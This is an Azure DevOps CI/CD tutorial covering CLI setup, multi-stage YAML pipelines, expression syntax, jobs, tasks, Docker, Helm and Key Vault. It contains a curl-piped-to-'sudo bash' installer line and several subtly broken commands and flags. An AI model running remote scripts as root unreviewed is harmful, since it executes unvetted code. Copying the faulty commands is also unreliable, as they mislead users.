# 🔷 CASE 1 — Azure DevOps: Pipelines End to End

> **Build a production-grade CI/CD pipeline in Azure DevOps**: multi-stage YAML, templates, variable groups backed by Key Vault, Workload Identity Federation service connections, Azure Container Registry, Environments with approval gates, a built-in canary deployment strategy, Azure Artifacts with upstream sources, Boards traceability, and Microsoft Defender for DevOps scanning.
>
> **Time:** 6–8 hours · **Level:** beginner → confident
> **Prereq:** [01-CICD-GUIDE.md](./01-CICD-GUIDE.md) §1–§4 and §6 read.
> **What you don't need:** an Azure subscription. ~80% of this case runs on the free Azure DevOps tier. Every step that needs Azure has a documented local equivalent.

---

## What you'll have at the end

```
✅ An Azure DevOps organisation, project, repo and Boards setup — from the CLI
✅ A multi-stage YAML pipeline: CI → dev → staging → (approval) → production
✅ `extends` templates that enforce security centrally (the 1es-style pattern)
✅ A variable group linked to Azure Key Vault — secrets never stored in Azure DevOps
✅ A Workload Identity Federation service connection — ZERO long-lived secrets
✅ Images built with BuildKit, cached, SBOM'd, pushed to ACR (or GHCR)
✅ Helm deployment to AKS (or kind) with --atomic and an automatic rollback
✅ An Environment with approvals, branch control, business hours and a REST check
✅ A `strategy: canary:` deployment job with increments, soak time and on-failure rollback
✅ Azure Artifacts with upstream sources — a caching proxy for npm/Maven/PyPI/NuGet
✅ Test results and coverage published to the build summary and linked to Boards
✅ Microsoft Defender for DevOps: credential scanning, dependency scanning, IaC scanning
✅ A self-hosted agent on a VM, and an understanding of VMSS agent pools
✅ 20+ troubleshooting recipes for the failures that actually happen
✅ 5 hands-on tasks with full worked answers
```

---

## 0 · Setup — the organisation, the project, the CLI

### 0.1 Create the organisation

```
1. go to https://aex.dev.azure.com/signin  (sign in with any Microsoft account)
2. "Create new organization"
     name:  shop-devops            → https://dev.azure.com/shop-devops
     project hosting: any region
     version control: Git
     ⭐ project visibility: PRIVATE  (a public project's pipelines can be run by
                                       anyone — see Guide §12)
3. "New project"
     Name: Shop
     Visibility: Private
     ⭐ Advanced → Work item process: Agile      (Scrum and Basic also work;
                                                    Agile has the richest states)
     ⭐ Advanced → Version control: Git
```

**Free tier limits** (as of 2026, and generous):

| | Free |
|---|---|
| Users | 5 basic (unlimited stakeholders — they can view Boards and pipelines) |
| Microsoft-hosted parallel jobs | **1** (1,800 minutes/month, 360 max job duration) |
| Self-hosted parallel jobs | **unlimited** ⭐ |
| Azure Artifacts | 2 GiB free, then paid |
| Repos | unlimited private repos |
| Boards | unlimited work items |
| Pipelines | unlimited pipelines and runs |

> ⭐ **"Unlimited self-hosted parallel jobs" is the free-tier superpower.** If you install one agent on a laptop or a $5 VM, you get unlimited concurrent builds for free. That's the setup we'll use for most of this case — and it's also what makes Azure DevOps the cheapest option at high volume (see [Guide §15.3](./01-CICD-GUIDE.md)).

### 0.2 The CLI

```bash
# ── install ──────────────────────────────────────────────────────
# the Azure CLI + the azure-devops extension
brew install azure-cli                                   # macOS
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash   # Debian/Ubuntu
az extension add --name azure-devops
az version                                              # verify

# ── log in ───────────────────────────────────────────────────────
az login                                                # opens a browser
az account list --output table                          # if you have a subscription
az account set --subscription "<name or id>"

# ── the Azure DevOps-specific login ──────────────────────────────
az devops configure --defaults organization=https://dev.azure.com/shop-devops project=Shop
az devops login          # ⭐ prompts for a PAT, or uses `az login` if the org is
                         #   in the same tenant
# create the PAT if asked:
#   https://dev.azure.com/shop-devops/_usersSettings/tokens
#   Scopes: ⭐ Code (Read & write), Build (Read & execute), Release,
#           Project and Team (Read), Pipeline Resources, Environment (Read & manage)
#   Expiry: 90 days MAXIMUM. ⭐ Never 365.

# ┭ put it in the keychain, not in shell history
export AZURE_DEVOPS_EXT_PAT=$(security find-generic-password -s azdevops-pat -w 2>/dev/null || read -rs -p "PAT: " p && echo $p)

# ── verify ───────────────────────────────────────────────────────
az devops project list -o table
# ID                                    Name    Visibility
# 8f2a…-…                               Shop    private
az repos list -o table
az pipelines list -o table
az boards work-item type list --project Shop -o table
```

**The CLI commands you'll use constantly:**

```bash
az repos list                                     # the repos in the project
az repos create --name shop --project Shop
az repos pr list --repository shop --open
az repos pr create --repository shop --source-branch feature/x --target-branch main \
  --title "…" --description "…" --reviewers a@x.com --work-items 42 --squash true
az repos pr show 123
az repos pr checkout 123
az repos pr update 123 --status completed --merge-commit-message "…"

az pipelines list
az pipelines create --name shop-ci --repository shop --branch main \
  --yml-path azure-pipelines.yml --service-connection <github-conn-id>
az pipelines run --id <pipeline-id> --branch main
az pipelines run --id <pipeline-id> --branch main --parameters env=staging
az pipelines show --id <pipeline-id>
az pipelines update --id <pipeline-id> --configuration '{…}'
az runs list --pipeline-ids <id> --top 10 -o table
az runs show --run-id <id>
az runs cancel --run-id <id>
az pipelines runs artifact list --run-id <id>

az boards work-item list --project Shop --wi-types "User Story" --state New
az boards work-item create --project Shop --type Bug --title "…" --description "…"
az boards work-item show 42
az boards work-item update 42 --state Resolved --fields "System.AssignedTo=harish@x.com"

az artifacts universal publish --feed shop --name shop-api --version 1.4.2 --path dist/
az artifacts universal list --feed shop
az devops service-endpoint list --project Shop -o table
az devops service-endpoint azurerm create --name shop-wif \
  --azure-rm-service-principal-id … --azure-rm-subscription-id … \
  --azure-rm-tenant-id … --azure-rm-subscription-name …
az pipelines variable-group create --name shop-common --variables "FOO=bar"
az pipelines variable-group variable create --group-id <id> --name DB_PW --value x --secret true
az devops security permission list --project Shop
```

### 0.3 The repo

```bash
mkdir -p ~/shop && cd ~/shop
git init -b main

# the application — reuse it from the other learning paths
mkdir -p apps/{shop-ui,shop-api,checkout,order-worker,payment-mock} \
         helm/shop/{templates,values} helm/values \
         k8s/{base,overlays} scripts ci .pipelines/templates .pipelines/stages

# the Azure DevOps-specific layout ⭐
touch azure-pipelines.yml                    # the entry point (convention)
touch .pipelines/ci.yml                      # the CI pipeline
touch .pipelines/cd.yml                      # the CD pipeline
touch .pipelines/templates/{base-job.yml,security-scans.yml,build-image.yml,deploy-helm.yml,smoke-test.yml}
touch .pipelines/variables/{common.yml,dev.yml,staging.yml,production.yml}
touch .pipelines/environments.yml            # declared in code, see §9
touch .pipelines/branch-policy.json

cat > .gitignore <<'EOF'
target/ node_modules/ dist/ build/ __pycache__/ *.class *.jar
.env .env.* !.env.example
*.tfstate* .terraform/
.DS_Store
EOF

cat > README.md <<'EOF'
# shop
An e-commerce app used to learn CI/CD across Azure DevOps, GitHub Actions and Jenkins.
See ../cicd-learning-path/ for the curriculum.
EOF

git add -A && git commit -m "chore: initial scaffold"
```

**Two ways to host the code:**

```bash
# ⭐ OPTION A — an Azure DevOps Git repo (recommended for this case; no PAT juggling)
az repos create --name shop --project Shop -o json | jq -r '.remoteUrl'
# https://shop-devops@dev.azure.com/shop-devops/Shop/_git/shop
git remote add origin https://shop-devops@dev.azure.com/shop-devops/Shop/_git/shop
git push -u origin main

# OPTION B — GitHub, connected to Azure DevOps
#   Project Settings → Service connections → New → GitHub
#   ⭐ authorize with the "GitHub App" (not OAuth) — it lets you grant access to
#     only the repos you choose
az devops service-endpoint github create --name github-shop \
  --github-url https://github.com/3558Bhk/shop --token <PAT-or-installation>
git remote add origin git@github.com:3558Bhk/shop.git && git push -u origin main
# then: Pipelines → New pipeline → GitHub → authorize → select the repo →
#       "Existing Azure Pipelines YAML file" → azure-pipelines.yml
```

⚠️ **Option B has a security setting you must check:**
```
Project Settings → Pipelines → Pipeline security → "Forks and upstreams":
  ☑ Build pull requests created from forks
  ☐ ⛔ Make secrets available to builds of forks       ← MUST BE OFF
  ☑ Enforce job authorization scope
  ☑ Limit job authorization scope to current project
  ☐ Build pull requests created from GitHub Apps (choose deliberately)
```

### 0.4 The local cluster (the deploy target)

```bash
# create the kind cluster — one-time
cat > ~/shop/ci/kind.yaml <<'EOF'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
name: cicd
nodes:
  - role: control-plane
    extraPortMappings:
      - {containerPort: 30080, hostPort: 80}
      - {containerPort: 30443, hostPort: 443}
  - role: worker
  - role: worker
EOF
kind create cluster --config ~/shop/ci/kind.yaml --wait 5m
kubectl create namespace shop monitoring

# ⭐ a registry the agent can push to. Two options:
# A) a local registry (works with kind, no cloud account)
docker run -d --restart=always -p 5000:5000 --name registry registry:2.8
#    and tell kind to trust it:
cat > ~/shop/ci/registry-config.yaml <<'EOF'
containerd_config_patcher: |
  [plugins."io.containerd.grpc.v1.cri".registry.mirrors."localhost:5000"]
    endpoint = ["http://registry:5000"]
EOF
# B) GHCR — free, works from anywhere, and the token is a GitHub PAT
echo $GHCR_PAT | docker login ghcr.io -u 3558bhk --password-stdin
# C) ACR (if you have an Azure subscription) — see §7
```

**With an Azure subscription:**

```bash
az group create --name rg-shop --location centralindia
az acr create --name shopacr$(openssl rand -hex 3) --resource-group rg-shop \
  --sku Basic --admin-enabled false --public-network-enabled true
ACR=$(az acr list -g rg-shop --query '[0].name' -o tsv); echo $ACR
# ⭐ enable immutable tags and a retention policy — the supply-chain controls
az acr update -n $ACR -g rg-shop --data-endpoint-enabled false
az acr repository update -n $ACR --repository shop-api --write-enabled false 2>/dev/null || true
az policy assignment create --name acr-immutable --scope /subscriptions/$(az account show -q id -o tsv)/resourceGroups/rg-shop \
  --policy "496223c3adaf46a1701371c2a3e0b1b4" 2>/dev/null || \
  echo "  (assign the 'Container Registry should use immutable tags' policy from the portal)"

az aks create -g rg-shop -n shop-dev --node-count 2 --node-vm-size Standard_B2s \
  --attach-acr $ACR --generate-ssh-keys --network-plugin azure
az aks get-credentials -g rg-shop -n shop-dev --overwrite-existing
kubectl get nodes
```

---

## 1 · The first pipeline — YAML anatomy

### 1.1 The three expression syntaxes ⚠️ (the thing that confuses everyone)

Azure DevOps YAML has **three** different `$(...)`-looking syntaxes, evaluated at **three different times**. Get this wrong and your variables silently come out empty.

| Syntax | Name | Evaluated | Example | Can call functions? |
|---|---|---|---|---|
| `${{ }}` | **Template expression** | ⭐ **At compile time**, before the pipeline runs | `${{ variables.buildConfiguration }}` | ✅ Yes — full expression language |
| `$[ ]` | **Runtime expression** | At job/run time, before the step | `$[ dependencies.A.outputs['x.y'] ]` | ✅ Yes |
| `$( )` | **Macro syntax** | ⭐ **At agent runtime**, just before the step runs | `$(Build.SourcesDirectory)` | ❌ No — simple substitution |

```yaml
# ⭐ the classic demonstration
variables:
  myVar: 'hello'
  templateVar: ${{ variables.myVar }}          # ✅ resolves at compile time → "hello"
  runtimeVar: $[ variables['myVar'] ]          # ✅ resolves at runtime
steps:
  - script: |
      echo "macro:     $(myVar)"               # ✅ "hello" — replaced by the agent
      echo "template:  ${{ variables.templateVar }}"   # ✅ "hello" — already inline
      echo "runtime:   $(runtimeVar)"          # ✅ "hello"
      echo "in bash:   $MY_ENV"                # ✅ only if you mapped it (see below)
    env:
      MY_ENV: $(myVar)                          # ⭐ the SAFE way — map to a real env var

# ⛔ the trap: a macro variable CANNOT be used in a template expression
steps:
  - script: echo "${{ variables.someMacroVar }}"   # ⛔ empty at compile time
# ⛔ and a template expression CANNOT see a runtime-generated value
  - bash: echo "##vso[task.setvariable variable=dyn]value1"
  - script: echo "${{ variables.dyn }}"            # ⛔ empty — it doesn't exist yet
  - script: echo "$(dyn)"                          # ✅ correct
  - script: echo "$DYN"                            # ✅ correct, with env: DYN: $(dyn)
```

> 🔑 **The rule that keeps you sane:** use `$(( ))`… no — use **`env:` mapping and shell variables** for anything that could be untrusted or runtime-generated. `${{ }}` is for compile-time structure (conditions, loops, template parameters). `$( )` is for simple values. `$[ ]` is for cross-job outputs.

### 1.2 The minimal working pipeline

```yaml
# azure-pipelines.yml — ⭐ the conventional entry point
# ═══════════════════════════════════════════════════════════════════
trigger:
  branches:
    include: [main, 'release/*']
  paths:
    include: [apps/*, helm/*, k8s/*, .pipelines/*, azure-pipelines.yml]
    exclude: ['**/*.md', docs/*]           # ⭐ docs changes cost zero minutes

pr:
  branches:
    include: [main]
  paths:
    include: [apps/*, .pipelines/*]
  autoCancel: true                          # ⭐ cancel superseded PR builds
  drafts: false                             # ⭐ don't build draft PRs

schedules:
  - cron: '0 2 * * 1-5'                     # ⭐ UTC. 02:00 UTC = 07:30 IST
    displayName: Nightly dependency build
    branches: {include: [main]}
    always: true                            # run even if nothing changed

pool:
  vmImage: ubuntu-latest                    # ⭐ = Ubuntu 24.04, same image as GH Actions

variables:
  - group: shop-common                       # ⭐ a variable group from the Library
  - name: GO_VERSION
    value: '1.23'
  - name: JAVA_VERSION
    value: '21'
  - name: BUILD_CONFIGURATION
    value: Release
  - name: DOTNET_SKIP_FIRST_TIME_EXPERIENCE
    value: '1'
  - name: system.debug
    value: 'false'                           # ⭐ flip to true for verbose agent logs

name: $(Date:yyyyMMdd).$(Rev:.r)             # ⭐ the run NAME (not the version)
                                             #   e.g. 20260910.3

resources:
  repositories:
    - repository: templates                   # ⭐ a separate repo of shared templates
      type: github
      name: 3558Bhk/pipeline-templates
      ref: refs/tags/v1.4.0                   # ⭐⭐ PINNED TO A TAG, not a branch
      endpoint: github-shop
  pipelines:
    - pipeline: infra                         # ⭐ trigger on another pipeline's completion
      source: shop-infrastructure
      trigger: {branches: [main]}
  containers:
    - container: builder
      image: maven:3.9-eclipse-temurin-21

stages:
  - stage: CI
    displayName: 🏗️ Build and test
    jobs:
      - job: Checkout
        steps:
          - checkout: self
            fetchDepth: 0                     # ⭐ full history for changelogs/tags
            clean: true                       # ⭐ git clean before checkout
            lfs: true
            persistCredentials: true
          - pwsh: |
              Write-Host "Build ID:   $(Build.BuildId)"
              Write-Host "Source SHA: $(Build.SourceVersion)"
              Write-Host "Branch:     $(Build.SourceBranchName)"
              Write-Host "Reason:     $(Build.Reason)"
              Write-Host "Requested:  $(Build.RequestedFor)"
              Write-Host "Agent:      $(Agent.Name) on $(Agent.OS)"
              Write-Host "Workspace:  $(Pipeline.Workspace)"
            displayName: Print the build context
```

### 1.3 The predefined variables you must know ⭐

```
BUILD
  $(Build.BuildId)              4417              the run's unique integer ID
  $(Build.BuildNumber)          20260910.3        the run NAME (from `name:`)
  $(Build.DefinitionName)       shop-ci
  $(Build.SourceVersion)        a1b2c3d4…         the full commit SHA
  $(Build.SourceBranch)         refs/heads/main
  $(Build.SourceBranchName)     main              ⭐ the short form
  $(Build.Reason)               Manual|IndividualCI|BatchedCI|PullRequest|Schedule|…
  $(Build.RequestedFor)         Harish Kumar      who triggered it
  $(Build.QueuedBy)             …
  $(System.TeamProject)         Shop
  $(System.DefaultWorkingDirectory)  /home/vsts/work/1/s
  $(Build.ArtifactStagingDirectory) /home/vsts/work/1/a
  $(Build.BinariesDirectory)         /home/vsts/work/1/b
  $(Pipeline.Workspace)              /home/vsts/work/1     ⭐ the parent of all

SYSTEM
  $(System.StageName)           CI
  $(System.JobName)             Checkout
  $(System.AccessToken)         ⭐⭐ a short-lived token for the Azure DevOps REST API
  $(System.CollectionUri)       https://dev.azure.com/shop-devops/
  $(System.PullRequest.PullRequestNumber)   42   ⭐ only on PR builds
  $(System.PullRequest.SourceBranch)        refs/heads/feature/x
  $(System.PullRequest.TargetBranch)        refs/heads/main

AGENT
  $(Agent.OS)                   Linux
  $(Agent.Name)                 Hosted Agent
  $(Agent.ToolsDirectory)       /opt/hostedtoolcache

COMMON (the URLs you'll put in notifications)
  https://dev.azure.com/$(System.TeamProject)/_build/results?buildId=$(Build.BuildId)
```

```bash
# ⭐ System.AccessToken — how a pipeline talks back to Azure DevOps
- task: AzureCLI@2
  inputs:
    scriptType: bash
    scriptLocation: inlineScript
    inlineScript: |
      curl -s -u ":$SYSTEM_ACCESSTOKEN" \
        "$SYSTEM_TEAMFOUNDATIONCOLLECTIONURI$SYSTEM_TEAMPROJECT/_apis/build/builds/$BUILD_BUILDID?api-version=7.1" \
        | jq .status
  env:
    SYSTEM_ACCESSTOKEN: $(System.AccessToken)
# ⚠️ the build service account needs the "Project Collection Build Service" to have
#    the right permissions. Project Settings → Pipelines → permissions.
```

---

## 2 · Jobs, steps and tasks

### 2.1 The three kinds of job ⭐

```yaml
jobs:
  # ── 1. `job` — a normal build/test job ──────────────────────────
  - job: UnitTests
    displayName: 🧪 Unit tests
    timeoutInMinutes: 20
    cancelTimeoutInMinutes: 5
    continueOnError: false                    # ⭐ true = the job may fail without
                                              #    failing the stage ("quarantine")
    condition: succeeded()
    workspace:
      clean: all                              # ⭐ outputs | resources | all
    services:                                 # ⭐ sidecar containers
      postgres:
        image: postgres:17-alpine
        env: {POSTGRES_PASSWORD: shop, POSTGRES_DB: shop}
        ports: ['5432:5432']
        options: '--health-cmd "pg_isready -U postgres" --health-interval 5s --health-retries 10'
    variables:
      DB_URL: 'postgres://postgres:shop@localhost:5432/shop'
    steps:
      - script: mvn -B verify
        workingDirectory: apps/shop-api
        displayName: Maven verify
        env:
          SPRING_DATASOURCE_URL: $(DB_URL)
        retryCountOnTaskFailure: 2            # ⭐ built-in retry for flaky steps

  # ── 2. `deployment` — a job that targets an ENVIRONMENT ⭐⭐ ─────
  - deployment: DeployDev
    displayName: 🚀 Deploy to dev
    environment: dev                          # ⭐ triggers approvals + checks
    pool: {vmImage: ubuntu-latest}
    strategy:
      runOnce:                                # or canary / rolling
        deploy:
          steps:
            - download: current
              artifact: manifests
            - bash: ./scripts/deploy.sh dev

  # ── 3. a job inside a `container` ───────────────────────────────
  - job: MavenInContainer
    container:
      image: maven:3.9-eclipse-temurin-21
      options: '--user root --memory=4g'
      env: {MAVEN_OPTS: '-Dmaven.repo.local=$(Pipeline.Workspace)/.m2'}
      volumes:
        - /var/run/docker.sock:/var/run/docker.sock   # ⛔ only if you must; see Guide §3.3
    steps:
      - script: mvn -B package
```

### 2.2 Dependencies, conditions and the DAG

```yaml
stages:
  - stage: Build
    jobs: [{job: B, steps: [{script: echo build}]}]

  - stage: Test
    dependsOn: Build                          # ⭐ explicit dependency
    jobs:
      - job: Unit
      - job: Integration
        dependsOn: Unit                       # jobs can depend on jobs

  - stage: DeployDev
    dependsOn: Test
    condition: and(succeeded(), eq(variables['Build.SourceBranchName'], 'main'))
    jobs:
      - deployment: D
        environment: dev

  - stage: DeployProd
    dependsOn: DeployDev
    condition: |
      and(
        succeeded(),
        eq(variables['Build.SourceBranchName'], 'main'),
        or(eq(variables['Build.Reason'], 'Manual'),
           eq(variables['Build.Reason'], 'IndividualCI'))
      )
    jobs:
      - deployment: P
        environment: production               # ⭐ the approval gate lives here
```

**The condition functions:**

```
succeeded()                 all previous stages/jobs succeeded
failed()                    at least one failed
canceled()                  the run was cancelled
succeededOrFailed()
always()                    ⭐ run regardless (cleanup, reporting)
and(a, b)  or(a, b)  not(a)  xor(a, b)
eq(a, b)  ne(a, b)  gt(a, b)  ge(a, b)  lt(a, b)  le(a, b)
in(a, b, c)  notIn(a, b, c)
contains(haystack, needle)  startsWith(s, prefix)  endsWith(s, suffix)
coalesce(a, b, c)           the first non-null
length(array)  count(array)
variables['Name']           read a variable
stageDependencies.Build.outputs['Job.Step.Variable']   ⭐ cross-stage output
```

```yaml
# ⭐ the patterns you'll actually write
condition: succeeded()                                    # the default
condition: always()                                       # a reporting job
condition: and(succeeded(), eq(variables['Build.Reason'], 'PullRequest'))
condition: failed()                                       # a "notify on failure" job
condition: and(succeeded(), not(eq(variables['Build.Reason'], 'Schedule')))
condition: or(eq(variables.env, 'dev'), eq(variables.env, 'staging'))
condition: |
  and(succeeded(),
      in(variables['Build.SourceBranchName'], 'main', 'release/1.4'),
      not(canceled()))
```

### 2.3 Passing values between jobs and stages ⭐

```yaml
jobs:
  - job: Producer
    steps:
      - bash: |
          DIGEST=$(docker buildx imagetools inspect ghcr.io/3558bhk/shop-api:$TAG \
                   --format '{{json .Manifest}}' | jq -r .digest)
          echo "digest: $DIGEST"
          # ⭐⭐ the magic line — sets an OUTPUT variable on THIS step
          echo "##vso[task.setvariable variable=imageDigest;isOutput=true]$DIGEST"
          # and a plain (job-local) variable:
          echo "##vso[task.setvariable variable=buildDate]$(date -u +%F)"
          # and set the build's display name:
          echo "##vso[build.updatebuildnumber]$TAG-$DIGEST"
          # and log a warning/error that shows in the UI summary:
          echo "##vso[task.logissue type=warning]the image is unsigned"
          echo "##vso[task.logissue type=error;sourcepath=Dockerfile;linenumber=12]bad FROM"
          # and upload a file to the build summary:
          echo "##vso[task.uploadsummary]$PWD/summary.md"
          # and set a build tag (searchable in the UI):
          echo "##vso[build.addbuildtag]canary"
          # and fail the step from a script while still running later steps:
          echo "##vso[task.complete result=SucceededWithIssues;]partial success"
        name: emit                            # ⭐⭐ the step MUST have a name
        displayName: Emit the digest

  - job: Consumer
    dependsOn: Producer
    variables:
      # ⭐⭐ the reference syntax: dependencies.<JobName>.outputs['<StepName>.<VarName>']
      DIGEST: $[ dependencies.Producer.outputs['emit.imageDigest'] ]
    steps:
      - bash: echo "got $DIGEST from the Producer job"

# ── across STAGES ────────────────────────────────────────────────
stages:
  - stage: Build
    jobs:
      - job: B
        steps:
          - bash: echo "##vso[task.setvariable variable=tag;isOutput=true]1.4.2"
            name: meta
  - stage: Deploy
    dependsOn: Build
    variables:
      # ⭐ stageDependencies, not dependencies
      TAG: $[ stageDependencies.Build.outputs['B.meta.tag'] ]
    jobs:
      - job: D
        steps: [{bash: 'echo deploying $(TAG)'}]
```

```yaml
# ⭐ and the modern, cleaner alternative for a deployment job:
- deployment: Deploy
  environment: dev
  strategy:
    runOnce:
      deploy:
        steps:
          - bash: echo "$(Pipeline.Workspace)"
          # ⭐ download artifacts explicitly (deployment jobs do NOT auto-download)
          - download: current
            artifact: shop-api-image-info
            patterns: '**/*.json'
```

⚠️ **A normal `job` auto-downloads artifacts produced in the same stage. A `deployment` job does NOT — you must `download:` explicitly.** This trips up almost everyone on their first deployment job.

### 2.4 The task reference — the ones you'll actually use

```yaml
# ── shell ────────────────────────────────────────────────────────
- script: echo hello                     # cmd on Windows, bash elsewhere
- bash: |                                # ⭐ explicit bash
    set -euo pipefail
    ./scripts/deploy.sh
  displayName: Deploy
  workingDirectory: $(System.DefaultWorkingDirectory)
  failOnStderr: false                    # ⭐ true = fail if anything hits stderr
  env: {KUBECONFIG: $(Pipeline.Workspace)/kubeconfig}
  condition: succeeded()
  continueOnError: false
  timeoutInMinutes: 10
  retryCountOnTaskFailure: 0
  enabled: true
- pwsh: Write-Host hi                    # ⭐ cross-platform PowerShell 7
- powershell: …                          # Windows PowerShell 5

# ── artifacts ────────────────────────────────────────────────────
- publish: $(Build.ArtifactStagingDirectory)/manifests
  artifact: manifests                     # ⭐ the modern form
  displayName: Publish manifests
- download: current                       # or: `download: <pipeline resource name>`
  artifact: manifests
  path: $(Pipeline.Workspace)/manifests
  patterns: '**'
- downloadBuild:                          # ⭐ an artifact from ANOTHER build
    project: Shop
    pipeline: shop-ci
    buildVersionToDownload: latest
    artifactName: manifests
- task: PublishPipelineArtifact@1
  inputs: {targetPath: dist/, artifactName: dist, publishLocation: pipeline}
- task: DownloadPipelineArtifact@2
  inputs: {source: specific, project: Shop, pipeline: 42, artifact: dist, path: $(Pipeline.Workspace)}

# ── git ──────────────────────────────────────────────────────────
- checkout: self
  fetchDepth: 0
  clean: true
  lfs: true
  submodules: recursive
  persistCredentials: true                # ⭐ keeps the OAuth token for later git push
- checkout: templates                     # ⭐ a resource repository
  path: templates                         # relative to $(Build.SourcesDirectory)/..
- checkout: none                          # ⭐ skip checkout entirely
- task: AzureCLI@2                        # ⭐ or do it by hand:
- bash: |
    git config user.name  "shop-ci[bot]"
    git config user.email "shop-ci@shop.example.com"
    git checkout -b "bump/$(Build.BuildNumber)"
    git commit -am "chore: bump to $(Build.BuildNumber)"
    git push --set-upstream origin "bump/$(Build.BuildNumber)"

# ── Docker and containers ⭐ ─────────────────────────────────────
- task: Docker@2
  displayName: Login to ACR
  inputs:
    command: login
    containerRegistry: shop-acr           # ⭐ a Docker Registry service connection
- task: Docker@2
  displayName: Build and push
  inputs:
    command: buildAndPush
    repository: shop-api
    tags: |
      $(Build.SourceVersion)
      latest
    Dockerfile: apps/shop-api/Dockerfile
    buildContext: $(System.DefaultWorkingDirectory)
    arguments: '--pull --cache-from $(ACR)/shop-api:buildcache --build-arg VERSION=$(Build.SourceVersion)'
    addPipelineData: true                 # ⭐ adds OCI labels with the build info
- task: Docker@2
  inputs: {command: logout}

# ⭐ but for BuildKit features (SBOM, provenance, cache-to registry) use a script:
- bash: |
    set -euo pipefail
    docker buildx create --use --name builder || docker buildx use builder
    docker buildx inspect --bootstrap
    IMAGE="$ACR_LOGIN_SERVER/shop-api:$(Build.SourceVersion)"
    docker buildx build apps/shop-api \
      --file apps/shop-api/Dockerfile \
      --tag "$IMAGE" \
      --tag "$ACR_LOGIN_SERVER/shop-api:latest" \
      --cache-from "type=registry,ref=$ACR_LOGIN_SERVER/shop-api:buildcache" \
      --cache-to   "type=registry,ref=$ACR_LOGIN_SERVER/shop-api:buildcache,mode=max" \
      --provenance=mode=max --sbom=true \
      --build-arg VERSION=$(Build.SourceVersion) \
      --build-arg BUILDKIT_INLINE_CACHE=1 \
      --push
    DIGEST=$(docker buildx imagetools inspect "$IMAGE" --format '{{json .Manifest}}' | jq -r .digest)
    echo "##vso[task.setvariable variable=imageDigest;isOutput=true]$DIGEST"
    echo "✅ pushed $IMAGE@$DIGEST"
  name: buildx
  displayName: Build with BuildKit (SBOM + provenance)

# ── Kubernetes ⭐ ────────────────────────────────────────────────
- task: KubernetesManifest@1
  displayName: Deploy
  inputs:
    action: deploy
    connectionType: azureResourceManager
    azureSubscription: shop-wif           # ⭐ the WIF service connection
    resourceGroup: rg-shop
    kubernetesCluster: shop-dev
    namespace: shop
    manifests: '$(Pipeline.Workspace)/manifests/*.yaml'
    containers: '$(ACR_LOGIN_SERVER)/shop-api:$(Build.SourceVersion)'
    strategy: canary                      # ⭐ built-in canary via SMIs
    trafficSplitMethod: pod
    canaryStableLoads: 10
    imagePullSecrets: 'acr-pull-secret'
    forceDeployment: true
    annotateNamespace: true
- task: KubectlInstaller@0
  inputs: {kubectlVersion: latest}
- task: HelmInstaller@1
  inputs: {helmVersionToInstall: 3.16.2}
- task: HelmDeploy@0
  displayName: helm upgrade
  inputs:
    connectionType: Azure Resource Manager
    azureSubscription: shop-wif
    azureResourceGroup: rg-shop
    kubernetesCluster: shop-dev
    namespace: shop
    command: upgrade
    chartType: FilePath                   # or Name (from a repo) or Package
    chartPath: helm/shop
    releaseName: shop
    install: true
    recreate: false
    waitForExecution: true
    resetValues: false
    force: false
    arguments: >
      --atomic --timeout 10m
      --values helm/values/dev.yaml
      --set image.digest=$(IMAGE_DIGEST)
      --set image.revision=$(Build.SourceVersion)
      --set-string annotations."deployed-by"="azure-pipelines/$(Build.BuildId)"

# ── testing and reporting ⭐ ─────────────────────────────────────
- task: PublishTestResults@2
  displayName: Publish JUnit results
  inputs:
    testResultsFormat: JUnit              # JUnit | NUnit | VSTest | XUnit
    testResultsFiles: '**/TEST-*.xml'
    searchFolder: $(System.DefaultWorkingDirectory)
    mergeTestResults: true
    failTaskOnFailedTests: true           # ⭐⭐ make test failures FAIL the build
    testRunTitle: 'Unit tests — $(Build.SourceBranchName)'
    publishRunAttachments: true
- task: PublishCodeCoverageResults@2
  displayName: Publish coverage
  inputs:
    summaryFileLocation: '**/site/jacoco/jacoco.xml'   # ⭐ @2 wants JaCoCo XML or Cobertura
    pathToSources: $(System.DefaultWorkingDirectory)/apps/shop-api
    additionalCodeCoverageFiles: '**/*.exec'
    failIfCoverageEmpty: true
    codeCoverageTool: JaCoCo
- task: PublishCodeCoverageResults@1      # ⭐ @1 supports Cobertura
  inputs: {codeCoverageTool: Cobertura, summaryFileLocation: '**/coverage.xml'}

# ── caching ⭐ ───────────────────────────────────────────────────
- task: Cache@2
  displayName: Cache the Maven repo
  inputs:
    key: 'maven | "$(Agent.OS)" | $(Build.SourcesDirectory)/apps/shop-api/pom.xml'
    restoreKeys: |
      maven | "$(Agent.OS)"
    path: $(Pipeline.Workspace)/.m2
    cacheHitVar: MAVEN_CACHE_RESTORED
    restoreExactCache: false
- bash: mvn -B -Dmaven.repo.local=$(Pipeline.Workspace)/.m2 verify
  condition: and(succeeded(), ne(variables.MAVEN_CACHE_RESTORED, 'true'))

# ── Azure ────────────────────────────────────────────────────────
- task: AzureCLI@2
  inputs:
    azureSubscription: shop-wif           # ⭐ Workload Identity Federation
    addSpnToEnvironment: true             # exposes the idToken if you need it
    scriptType: bash
    scriptLocation: inlineScript
    workingDirectory: $(System.DefaultWorkingDirectory)
    inlineScript: |
      az account show -o table
      az aks get-credentials -g rg-shop -n shop-dev --overwrite-existing
      kubectl get nodes
    failOnStandardError: false
    useGlobalConfig: false
    powerShellErrorActionPreference: stop
- task: AzurePowerShell@5
  inputs: {azureSubscription: shop-wif, ScriptType: InlineScript,
           Inline: 'Get-AzResourceGroup', azurePowerShellVersion: LatestVersion}
- task: AzureWebApp@1                     # deploy to an App Service
- task: AzureFunctionApp@2
- task: AzureResourceGroupDeployment@2    # ⭐ ARM/Bicep templates
- task: AzureResourceManagerTemplateDeployment@3
  inputs:
    deploymentScope: Resource Group
    azureResourceManagerConnection: shop-wif
    subscriptionId: $(SUBSCRIPTION_ID)
    action: Create Or Update Resource Group
    resourceGroupName: rg-shop
    location: centralindia
    templateLocation: Linked artifact
    csmFile: infra/main.bicep             # or main.json
    overrideParameters: '-env dev'
    deploymentMode: Incremental
    deploymentOutputs: outputsJson
- task: AzureKeyVault@2                   # ⭐ pull secrets from Key Vault into variables
  inputs:
    azureSubscription: shop-wif
    KeyVaultName: kv-shop-devops
    SecretsFilter: '*'                    # or 'DB-PASSWORD,API-KEY'
    RunAsPreJob: false                    # ⭐ true = fetch before ANY job step

# ── Artifacts (the package feed) ─────────────────────────────────
- task: UniversalPackages@0
